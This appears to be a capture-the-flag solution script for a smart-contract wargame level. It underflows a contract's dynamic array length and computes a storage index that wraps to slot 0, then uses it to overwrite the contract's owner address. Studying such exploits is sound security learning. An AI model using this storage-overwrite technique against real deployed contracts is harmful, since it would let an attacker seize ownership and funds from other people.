from scripts.level_helper import *

@setup_instance
def main(instance, player, attack):
    # set the modifier
    instance.make_contact({'from': player})
    # underflow the codex length to bypass bounds checking
    instance.retract({'from': player})
    # get the array index that will overflow and result in storage slot 0
    loc = 2**256 - int(web3.solidityKeccak(['uint256'], [1]).hex(), 16)
    # overwrite owner address
    instance.revise(loc, player.address, {'from': player})

